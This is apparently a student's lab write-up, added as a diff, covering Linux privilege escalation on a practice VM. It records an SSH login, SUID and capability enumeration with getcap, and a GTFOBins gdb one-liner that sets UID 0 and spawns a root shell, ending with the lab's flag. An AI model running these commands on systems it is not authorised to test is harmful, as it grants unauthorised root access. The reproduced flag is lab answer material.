@@ -1,0 +1,51 @@
+Questions 2
+Connect to VM 2 and gain a root shell by abusing capabilities.
+
+ssh joe@192.168.233.214
+
+passwd
+
+# Open another shell
+
+ps u -C passwd
+root      1455  0.0  0.1   9364  3056 pts/1    S+   09:32   0:00 passwd
+
+# Confirmed is root user
+
+grep Uid /proc/1455/status
+Uid:    1000    0       0       0
+
+ls -asl /usr/bin/passwd
+64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+
+# The SUID flag is depicted with the s flag in the above output. This flag can be configured using the chmod u+s <filename> command, and it sets the effective UID of the running process to the executable owner's user ID - in this case root's.
+
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+# Unable to work
+
+# manually enumerate our target system for binaries with capabilities. We are going to run getcap with the -r parameter to perform a recursive search starting from the root folder /, filtering out any errors from the terminal output.
+/usr/sbin/getcap -r / 2>/dev/null
+/usr/bin/gdb = cap_setuid+ep
+
+# Here we have the gdb with capabilities set uid + ep
+https://gtfobins.github.io/
+# Check the gtfobins gdb capabilities
+gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+# whoami
+root
+# pwd
+/root
+# ls
+flag.txt
+# cat flag.txt
+OS{cb8285b37399ed6398371ceeec9cd1e6}
+
+
+
+
+
+
+
+
+
+
